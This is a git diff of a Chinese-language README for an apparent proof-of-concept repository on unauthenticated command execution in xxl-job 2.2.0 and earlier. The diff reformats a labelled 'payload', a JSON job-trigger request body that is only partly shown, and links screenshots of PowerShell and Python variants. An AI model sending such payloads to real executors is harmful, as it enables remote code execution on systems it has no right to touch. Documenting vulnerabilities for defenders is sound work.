@@ -4,9 +4,8 @@ XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅�
 在xxl-job<= 2.2.0版本存在未授权命令执行
 
 ## payload:
-var hello = function () {
-
-console.log('{
+```
+{
   "jobId": 1,
   "executorHandler": "demoJobHandler",
   "executorParams": "demoJobHandler",
@@ -19,10 +18,8 @@ console.log('{
   "glueUpdatetime": 1586699003758,
   "broadcastIndex": 0,
   "broadcastTotal": 0
-}')
-
 }
-
+```
 
 ![image](https://github.com/mrknow001/xxl-job-rce/blob/main/xxl-job-powershell.png)
 ![image](https://github.com/mrknow001/xxl-job-rce/blob/main/xxl-job-python.png)
